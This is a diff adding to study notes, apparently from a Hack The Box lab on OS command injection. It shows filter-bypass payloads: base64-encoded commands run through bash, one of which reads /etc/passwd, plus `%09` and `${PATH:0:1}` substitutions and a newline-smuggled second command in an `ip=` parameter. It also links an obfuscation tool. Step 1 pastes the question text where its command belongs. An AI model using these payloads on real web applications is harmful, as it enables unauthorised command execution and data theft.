@@ -145,3 +145,14 @@ PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::Fr
 
 21y4d
 ```
+- Find the output of the following command using one of the techniques you learned in this section: find /usr/share/ | grep root | grep mysql | tail -n 1
+- Step 1: base64 the thing `Find the output of the following command using one of the techniques you learned in this section: find /usr/share/ | grep root | grep mysql | tail -n 1 `
+- Step 2: make sure it decodes nicely locally `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)`
+- Step 3: hey theres a blank space there, that's illegal. Use an alternative like `%09` - `bash<<<$(base64%09-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)`
+-  
+Step 4: All together now - `ip=127.0.0.1%0abash<<<$(base64%09-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)`
+
+# Tools
+- [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)
+
+Skill Assessment: `%26c\a\t%09${PATH:0:1}flag.txt` which translates to --> `& cat /flag.txt`
